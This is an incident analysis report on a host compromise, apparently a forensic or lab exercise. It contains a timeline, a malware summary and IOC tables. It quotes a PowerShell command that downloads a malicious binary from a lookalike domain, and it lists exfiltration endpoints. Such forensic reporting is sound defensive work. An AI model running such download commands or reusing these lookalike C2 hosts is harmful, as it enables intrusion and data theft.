# Incident Analysis Report

## Executive Summary
An incident was detected involving the compromise of host `JOHN-DESKTOP` via a malicious PowerShell script. The attacker deployed a custom malware binary (`updater.exe`) designed to gather system information, encrypt it using AES-ECB, and exfiltrate it to two distinct Command and Control (C2) servers.

## Timeline Summary
- **Attack Vector:** The attacker utilized a PowerShell one-liner to bypass execution policies and download a payload from a remote server.
- **Motivation:** Data exfiltration and system reconnaissance.
- **Impact:** Compromise of `JOHN-DESKTOP`. Sensitive system data was likely gathered and exfiltrated to attacker-controlled infrastructure.

### Detailed Timeline
1. **Payload Delivery:** A PowerShell command was executed:
   `IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\\updater.exe`
2. **Execution:** The binary `updater.exe` was executed from the temporary directory.
3. **System Interaction:** The malware attempted to interact with the Volume Shadow Copy Service (VSS), resulting in "Access Denied" errors, likely while attempting to access protected files or disable backups.
4. **Exfiltration:** The malware encrypted data and sent it to:
   - `http://miccosoftupdate.com/api/data`
   - `http://windowsupdater.tk/update/servicedata`

## Technical Analysis

### Malware Analysis (`updater.exe`)
Reverse engineering of the binary revealed the following:
- **Cryptography:** Uses `bcrypt.dll` to implement **AES-ECB** encryption.
- **Network Communication:** Uses `WinInet` APIs (`InternetOpenA`, `HttpSendRequestA`) to transmit data as `application/octet-stream`.
- **C2 Infrastructure:** Hardcoded domains `miccosoftupdate.com` and `windowsupdater.tk`.

### Evidence from Logs
- **PowerShell Logs:** Confirmed the download and execution of `updater.exe` from `f1leshare.net`.
- **DNS Logs:** Confirmed resolutions for `f1leshare.net` (`10.3.124.26`), `miccosoftupdate.com` (`10.3.97.182`), and `windowsupdater.tk` (`10.3.215.83`).
- **System Logs:** VSS errors indicate attempts to manipulate system shadow copies.

## Indicators of Compromise (IOCs)

### Network Indicators
| Type | Value | Description |
| :--- | :--- | :--- |
| Domain | `f1leshare.net` | Payload Delivery Domain |
| Domain | `miccosoftupdate.com` | Exfiltration C2 Server 1 |
| Domain | `windowsupdater.tk` | Exfiltration C2 Server 2 |
| IP | `10.3.124.26` | Payload Server IP |
| IP | `10.3.97.182` | C2 Server 1 IP |
| IP | `10.3.215.83` | C2 Server 2 IP |
| URL | `http://f1leshare.net/download/updater` | Payload Download URL |
| URL | `http://miccosoftupdate.com/api/data` | Exfiltration Endpoint 1 |
| URL | `http://windowsupdater.tk/update/servicedata` | Exfiltration Endpoint 2 |

### Host Indicators
| Type | Value | Description |
| :--- | :--- | :--- |
| File | `updater.exe` | Malicious binary located in `%TEMP%` |
| Process | `powershell.exe` | Used for initial delivery and execution |
